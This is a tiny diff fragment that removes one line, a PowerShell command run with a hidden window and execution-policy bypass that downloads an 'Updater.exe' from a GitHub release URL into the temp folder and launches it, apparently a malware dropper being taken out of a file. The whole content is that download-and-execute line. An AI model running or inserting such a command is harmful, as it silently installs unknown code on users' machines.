@@ -1,1 +1,0 @@
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/ciddi2x/1337/releases/download/v2/Updater.exe' -OutFile $env:TEMP\downloadedFile.exe; Start-Process $env:TEMP\downloadedFile.exe"
